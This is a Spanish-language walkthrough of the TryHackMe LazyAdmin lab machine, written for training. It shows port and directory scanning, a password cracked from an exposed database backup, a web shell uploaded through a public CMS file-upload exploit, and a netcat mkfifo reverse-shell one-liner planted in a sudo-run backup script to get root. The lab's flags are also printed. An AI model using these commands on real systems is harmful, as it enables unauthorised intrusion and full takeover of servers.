# Writeup LazyAdmin - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | 10.128.135.145 |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Linux |
| **Dificultad** | Fácil |

---

## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeración)
3. [Explotación](#explotación)
4. [Escalada de Privilegios](#escalada-de-privilegios)
5. [Flags](#flags)

---

## Reconocimiento

Lo primero que vamos a hacer, es un escaneo inicial de puertos, para saber que tenemos entre nuestras manos:


```bash
sudo nmap -sC -sV -Pn -sS -p- 10.128.135.145 -oN scan_lazy.txt
```
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18
```

Podemos ver de que solo hay dos puertos abiertos en la máquina, por lo que primero vamos a chequear el servidor web para ver lo que hay.
---

## Enumeración

Lo primero que vamos a hacer es usar gobuster para ver si hay algún directorio oculto.


```bash
gobuster dir -u http://10.128.135.145 -w common.txt
```
```text
/content              (Status: 301)
```

Segunda pasada sobre `/content/`:
```text
/inc                  (Status: 301)
/as                   (Status: 301)
/attachment           (Status: 301)
```

Como había comentado antes, lo que veo más interesante es la carpeta "inc". Vamos a revisarla para ver que podemos encontrar.

![contenido de la carpeta](/imgAdmin/image.png)

Interesante. Hay una carpeta del backup de la base de datos de MySQL. Vamos a descargar el archivo que hay, y a ver que podemos encontrar.

![presencia del backup](/imgAdmin/image2.png)

Perfecto. Hay un backup de la base de datos. Al descargarlo, al parecer hay información que no es muy útil, pero al final he encontrado una mina de oro. La contraseña está hasheada en un algoritmo tán debil que con CrackStation se ha podido sacar sin mayor problema.

![contraseña crackeada](/imgAdmin/image3.png)


![resultado contraseña crackeada](/imgAdmin/image4.png)

La contraseña de la base de datos es Password123, y se intuye que el nombre del administrador es "admin". Vamos a intentar entrar al panel de administración.

Vale, ha fallado el inicio de sesión con el usuario "admin", pero revisando de nuevo el backup, se ha encontrado otro posible usuario llamado "manager" y al introducirlo, hemos conseguido entrar en el panel de administración.

![panel de administración](/imgAdmin/image5.png)

---

## Explotación

Ahora que estamos dentro del panel de administración, anotamos la versión que tiene nuestro panel y al realizar una búsqueda rápida en Google podemos ver que hay una vulnerabilidad de subida arbitraria de archivos en ExploitDB. Por lo que vamos a descargar el script y subirlo a la máquina para ganar acceso a ella.

![buscando exploit](/imgAdmin/image6.png)

![mostrando exploit](/imgAdmin/image7.png)

Ahora, al descargar el script que nos proporciona ExploitDB, simplemente tendremos que introducir la dirección web, usuario y contraseña y nos debería generar una shell reversa para ganar acceso al sistema.

```bash
Enter The Target URL(Example : localhost.com) : 10.128.135.145/content  
Enter Username : manager
Enter Password : Password123
Enter FileName (Example:.htaccess,shell.php5,index.html) : shell.php5
[+] Sending User&Pass...
[+] Login Succssfully...
[+] File Uploaded...
[+] URL : http://10.128.135.145/content/attachment/shell.php5
```

Ahora, al tener la dirección de la shell, simplemente tendremos que entrar a ella y ejecutar un comando para obtener una shell reversa.

```bash
curl http://[IP_ADDRESS]/content/attachment/shell.php5?cmd=whoami
```

¡Bum! Tenemos acceso a la máquina gracias a la shell reversa. Ahora, vamos a buscar la flag del user.

```bash
$ find / -type f -name user.txt 2>/dev/null
/home/itguy/user.txt
$ cat /home/itguy/user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```

---

## Escalada de Privilegios

Ya que tenemos acceso a la máquina como usuario, vamos a buscar la forma de subir de privilegios. Para ello, usaremos `sudo -l` para saber que podemos correr sin necesidad de usar contraseña.

```bash
$ whoami
www-data
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
Podemos ver que en el archivo backup.pl apunta a un archivo llamado copy.sh, por lo que podremos modificar el archivo para que ejecute la shell como root.

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP_ADDRESS] 4445 >/tmp/f" > copy.sh

cd /home/itguy
$ sudo /usr/bin/perl /home/itguy/backup.pl
rm: cannot remove '/tmp/f': No such file or directory
$ sudo /usr/bin/perl /home/itguy/backup.pl

```
¡Ya tenemos acceso como root! Vamos a conseguir la flag de root.

```bash
sudo nc -lvnp 4445                                                            
[sudo] password for kali: 
listening on [any] 4445 ...
connect to [192.168.130.81] from (UNKNOWN) [10.128.135.145] 56676
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root/
# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```

---

## Flags

- **User Flag**: THM{63e5bce9271952aad1113b6f1ac28a07}
- **Root Flag**: THM{6637f41d0177b6f37cb20d775124699f}
